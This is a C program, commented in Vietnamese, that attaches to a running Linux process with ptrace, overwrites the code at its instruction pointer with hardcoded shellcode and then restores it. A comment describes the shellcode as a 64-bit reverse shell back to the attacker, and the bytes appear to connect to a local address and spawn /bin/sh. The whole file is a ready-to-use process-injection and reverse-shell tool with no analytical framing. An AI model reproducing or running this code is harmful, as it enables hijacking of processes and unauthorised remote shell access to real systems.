#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>

// đọc bộ nhớ process
void read_mem(pid_t target_pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i = 0;
  while (i < len / sizeof(long)) {
    chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, remaining);
  }
}

// ghi bộ nhớ process
void write_mem(pid_t target_pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i = 0;
  while (i < len / sizeof(long)) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
    ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
    i++;
  }
  int remaining = len % sizeof(long);
  if (remaining) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);
    ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
  }
}

int main(int argc, char *argv[]) {
  if (argc != 2) {
    printf("usage: %s <target_pid>\n", argv[0]);
    return 1;
  }

  pid_t target_pid = atoi(argv[1]);

  // shellcode reverse shell 64-bit Linux về attacker
  unsigned char payload[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";

  int payload_len = sizeof(payload) - 1;
  char original_code[payload_len];

  struct user_regs_struct target_regs;

  printf("Attaching to process %d\n", target_pid);
  if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
    perror("Failed to attach :(");
    return 1;
  }
  waitpid(target_pid, NULL, 0);

  ptrace(PTRACE_GETREGS, target_pid, NULL, &target_regs);

  read_mem(target_pid, target_regs.rip, original_code, payload_len);

  write_mem(target_pid, target_regs.rip, payload, payload_len);

  ptrace(PTRACE_CONT, target_pid, NULL, NULL);

  wait(NULL);

  write_mem(target_pid, target_regs.rip, original_code, payload_len);

  ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

  printf("injection complete\n");
  return 0;
}
